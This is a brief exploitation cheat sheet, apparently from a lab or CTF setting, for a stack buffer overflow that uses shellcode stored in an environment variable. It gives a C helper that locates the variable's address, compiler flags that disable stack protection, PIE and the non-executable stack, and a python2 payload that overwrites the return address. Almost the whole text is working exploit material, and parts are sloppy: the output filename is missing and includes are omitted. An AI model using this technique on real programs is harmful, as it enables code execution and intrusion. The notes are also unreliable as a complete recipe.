# PATH with shell code
```
[+] get a shell code path for real address code
#include <stdio.h>

int main(int argc, char *argv[]) {
	
	char *ptr;
	ptr = getenv(argv[1]);
	ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
	printf("%s Address : %p\n" ,argv[1] ,ptr);


	return 0;
}

[+] Compile Option
gcc -m32 -o 
-fno-stack-protector
-mpreferred-stack-boundary=2
-no-pie
-z execstack

[+] PAYLOAD
./example $(python2 -c "print 'a'*{offset} + '{Shell_Code Address}'")

```